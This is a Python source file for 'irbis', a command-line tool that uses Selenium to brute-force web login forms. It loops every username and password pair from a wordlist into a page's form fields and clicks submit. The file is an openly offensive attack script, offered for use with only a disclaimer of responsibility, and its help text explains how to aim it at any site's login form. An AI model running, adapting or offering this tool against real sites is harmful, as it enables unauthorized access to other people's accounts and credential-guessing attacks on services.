#--Inserts--#
import os
import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

#--Color--#
RESET = '\033[0m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
PURPLE = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BOLD = '\033[1m'
MAROON = '\033[38;2;128;0;0m'

#--Prints--#
ascii_art = f"""
{GREEN}             _____
{GREEN}          .-'.  ':'-.
{GREEN}        .''::: .:    '.    {RED} ██▓ ██▀███   ▄▄▄▄    ██▓  ██████       
{GREEN}       /   :::::'      |   {RED}▓██▒▓██ ▒ ██▒▓█████▄ ▓██▒▒██    ▒       
{GREEN}      ;.    ':' `       ;  {RED}▒██▒▓██ ░▄█ ▒▒██▒ ▄██▒██▒░ ▓██▄        
{GREEN}      |       '..       |  {RED}░██░▒██▀▀█▄  ▒██░█▀  ░██░  ▒   ██▒      
{GREEN}      ; '      ::::.    ;  {RED}░██░░██▓ ▒██▒░▓█  ▀█▓░██░▒██████▒▒       
{GREEN}       \       '::::   /   {RED}░▓  ░ ▒▓ ░▒▓░░▒▓███▀▒░▓  ▒ ▒▓▒ ▒ ░     
{GREEN}        '.      :::  .'    {RED}  ▒ ░  ░▒ ░ ▒░▒░▒   ░  ▒ ░░ ░▒  ░ ░
{GREEN}          '-.___'_.-'      {RED}  ▒ ░  ░░   ░  ░    ░  ▒ ░░  ░  ░  {RESET}
"""

help_list = f"""
-l : Enter the website link, you want to bruteforce. Example, irbis -l https://www.google.com/
-w : Specify path to wordlist, you want to use for bruteforce. Example, irbis -w ./wordlist.txt
-y : Start the proccess without second thoughts.

Parameters : Used to define next parameter type. Example, irbis -l <link> -w <wordlist> --name <additional parameter> <value>
--name : Defines value type as name. {RED}If changing element is not neccessary or if you have no info, then don't use this!{RESET}
--id : Defines value type as id. {RED}If changing element is not neccessary or if you have no info, then don't use this!{RESET}
--xpath : Defines value type as path. {RED}If changing element is not neccessary or if you have no info, then don't use this!{RESET}
--end : USe to define that command is ended. {BLUE} required at the end of the run comman!!{RESET}

Additional Parameters
-u : used to edit username parameter. If you don't know username parameter, don't use it!
-p : used to edit password parameter. If you don't know password parameter, don't use it!
-b : used to edit button parameter. If you don't know button properties, don't use it!

Example usage of al : 
    irbis -l {CYAN}https://kahleryasla.github.io/bilgay-brute-force/{RESET} -w {CYAN}./common.txt {GREEN}-y {RESET}--name -u username -p password --xpath -b /html/body/div/form/button {RED}--end{RESET}

{YELLOW}Use it for the good of others! I don't take the responsibility of your actions! {RESET} 
{CYAN}Follow me for more on Instagram{BOLD}{MAROON} @bilgayaslan_ {RESET}
"""

#--Variables--#
ac_link = None
ac_list = None
can_pass = False

usrname_type = By.ID
passwd_type = By.ID
button_type = By.XPATH

usrname_value = "username"
passwd_value = "password"
button_value = "/html/body/div/form/button"

parameter = ["-l", "-w", "-y", "-u", "-p", "-b", "--name", "--id", "--xpath"]
params = ["-l", "-w", "-y"]
additional = ["--name", "--id", "--xpath", "--end"]
extras = ["-u", "-p", "-b"]

equation_extras = {
        "-l" : ac_link,
        "-w" : ac_list,
        "-u" : usrname_type,
        "-p" : passwd_type,
        "-b" : button_type
}
equation_params = {
        "-u" : usrname_value,
        "-p" : passwd_value,
        "-b" : button_value,
        "-w" : ac_list,
        "-l" : ac_link
}
equation_additions = {
        "--name" : By.NAME,
        "--id" : By.ID,
        "--xpath" : By.XPATH
}

#--Functions--#
"""def check_if(check):
    if check in parameter or check > len(sys.argv):
        return False
    else:
        return True
"""
def get_arguments(arg):
    if arg in sys.argv:
        if arg in extras or arg in params:
            arg_index = sys.argv.index(arg)
            equation_params[arg] = sys.argv[arg_index + 1]
        else:
            stop_index = None
            arg_index = sys.argv.index(arg)
        
            for stop_argument in sys.argv:
                if stop_argument in additional or stop_argument in params: 
                    if sys.argv.index(stop_argument) > arg_index:
                        stop_index = sys.argv.index(stop_argument)
                        break
        
            for i in range(arg_index, stop_index):
                if sys.argv[i] not in params or sys.argv[i] not in additional and sys.argv[i] in extras:
                    equation_extras[sys.argv[i]] = equation_additions[arg]
                    equation_params[sys.argv[i]] = sys.argv[i + 1]


def main():
    print(ascii_art)
    print(help_list)

    if len(sys.argv) == 1:
        exit()

    get_arguments("--name")
    get_arguments("--id")
    get_arguments("--xpath")
    get_arguments("-u")
    get_arguments("-p")
    get_arguments("-b")
    get_arguments("-w")
    get_arguments("-l")

    can_pass = False

    if "-y" in sys.argv:
        can_pass = True
    else:
        can_pass = False

    if not can_pass:
        answer = input(f"{RED}Do you want to start the operation (Y/n){RESET}")
        
        while True:
            if answer.lower() == "y":
                break
            elif answer.lower() == "n":
                exit()
            else:
                answer = input("Illegal input! Please use only letters (y/n)")

    #--MAIN SCRIPT--#
    print(f"{MAROON}{BOLD} STARTING BRUTE FORCE ATTACK{RESET}")
    driver = webdriver.Firefox()
    driver.get(equation_params["-l"])

    username_el = driver.find_element(equation_extras["-u"], equation_params["-u"])
    password_el = driver.find_element(equation_extras["-p"], equation_params["-p"])
    button = driver.find_element(equation_extras["-b"], equation_params["-b"])
    username = ""
    password = ""

    with open(equation_params["-w"]) as file:
        for line in file:
            username = line
            with open(equation_params["-w"]) as file2:
                for line2 in file2:
                    password = line2
                    username_el.clear()
                    password_el.clear()
                    username_el.send_keys(username)
                    password_el.send_keys(password)
                    button.click()

if __name__ == "__main__":
    while True:
        try:
            os.system("clear")
            main()
        except KeyboardInterrupt:
            os.system("clear")
            print(ascii_art)
            print(help_list)
            print(f"{YELLOW}Operation interrupted! Quiting!")
            sys.exit(0)
